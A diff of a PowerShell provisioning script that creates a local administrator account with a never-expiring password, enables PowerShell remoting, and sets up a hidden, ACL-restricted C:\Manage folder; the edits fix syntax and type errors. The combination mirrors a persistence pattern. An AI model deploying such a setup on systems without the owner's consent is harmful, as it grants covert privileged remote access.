@@ -9,14 +9,16 @@ $ManagePath = "C:\Manage"
 
 if (!(Get-LocalUser -Name $UserName -ErrorAction SilentlyContinue)) {
     $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
-    New-LocalUser -Name $UserName -Password $SecurePassword -Description "System Manager Account" -PasswordNeverExpires $true | Out-Null
+    New-LocalUser -Name $UserName -Password $SecurePassword -Description "System Manager Account" -PasswordNeverExpires:$true | Out-Null
+    
+    Start-Sleep -Seconds 1
     Add-LocalGroupMember -Group "Administrators" -Member $UserName
     Write-Host "[+] $UserName account created successfully." -ForegroundColor Green
 } else {
     Write-Host "[-] $UserName account already exists." -ForegroundColor Gray
 }
 
-Set-ExecutionPolicy RemoteSigned -Force
+Set-ExecutionPolicy RemoteSigned -Force -ErrorAction SilentlyContinue
 Enable-PSRemoting -Force -SkipNetworkProfileCheck
 Restart-Service WinRM
 
@@ -25,14 +27,20 @@ if (!(Test-Path $ManagePath)) { New-Item -ItemType Directory -Path $ManagePath |
 $Acl = Get-Acl $ManagePath
 $Acl.SetAccessRuleProtection($true, $false)
 
+Add-Type -AssemblyName "System.DirectoryServices"
+
 $ManagerAccount = New-Object System.Security.Principal.NTAccount($UserName)
 $AdminGroup = New-Object System.Security.Principal.NTAccount("Builtin\Administrators")
 $SystemGroup = New-Object System.Security.Principal.NTAccount("SYSTEM")
 
-$FullControl = "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow"
-$ManagerRule = New-Object System.Security.Principal.FileSystemAccessRule($ManagerAccount, $FullControl)
-$AdminRule = New-Object System.Security.Principal.FileSystemAccessRule($AdminGroup, $FullControl)
-$SystemRule = New-Object System.Security.Principal.FileSystemAccessRule($SystemGroup, $FullControl)
+$FullControl = [System.Security.AccessControl.FileSystemRights]::FullControl
+$Inheritance = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit, ObjectInherit"
+$Propagation = [System.Security.AccessControl.PropagationFlags]::None
+$Type = [System.Security.AccessControl.AccessControlType]::Allow
+
+$ManagerRule = New-Object System.Security.AccessControl.FileSystemAccessRule($ManagerAccount, $FullControl, $Inheritance, $Propagation, $Type)
+$AdminRule = New-Object System.Security.AccessControl.FileSystemAccessRule($AdminGroup, $FullControl, $Inheritance, $Propagation, $Type)
+$SystemRule = New-Object System.Security.AccessControl.FileSystemAccessRule($SystemGroup, $FullControl, $Inheritance, $Propagation, $Type)
 
 $Acl.SetAccessRule($ManagerRule)
 $Acl.SetAccessRule($AdminRule)
@@ -40,7 +48,7 @@ $Acl.SetAccessRule($SystemRule)
 
 Set-Acl $ManagePath $Acl
 
-$Folder = Get-Item $ManagePath
+$Folder = Get-Item $ManagePath -Force
 $Folder.Attributes = [System.IO.FileAttributes]::Directory -bor [System.IO.FileAttributes]::Hidden
 
 Write-Host "`n=== Installation Complete! ===" -ForegroundColor Cyan
